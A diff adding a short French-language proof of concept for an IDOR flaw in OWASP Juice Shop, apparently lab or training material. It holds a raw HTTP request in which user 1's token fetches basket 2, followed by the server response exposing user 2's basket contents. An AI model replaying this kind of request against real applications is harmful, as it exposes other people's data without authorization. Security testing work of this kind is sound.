@@ -1,0 +1,25 @@
+### SEC-VULN-02: Preuve de Concept - Broken Access Control (IDOR)
+### Cible : OWASP Juice Shop /rest/basket/{basketId}
+
+GET /rest/basket/2 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImVtYWlsIjoidXNlcl9hQGV4YW1wbGUuY29tIiwiaWQiOjEsImJpZCI6MX0sImlhdCI6MTcyOTk0MDAwMH0.signature
+Accept: application/json, text/plain, */*
+Connection: close
+
+### RÉPONSE DU SERVEUR (HTTP 200 OK avec le panier de l'utilisateur #2 dérobé) :
+# HTTP/1.1 200 OK
+# Content-Type: application/json; charset=utf-8
+# 
+# {
+#   "status": "success",
+#   "data": {
+#     "id": 2,
+#     "UserId": 2,
+#     "coupon": "DISCOUNT10",
+#     "Products": [
+#       { "id": 3, "name": "Banana Juice (1000ml)", "price": 2.99, "BasketItem": { "quantity": 4 } },
+#       { "id": 8, "name": "OWASP Juice Shop Card Deck", "price": 9.99, "BasketItem": { "quantity": 1 } }
+#     ]
+#   }
+# }
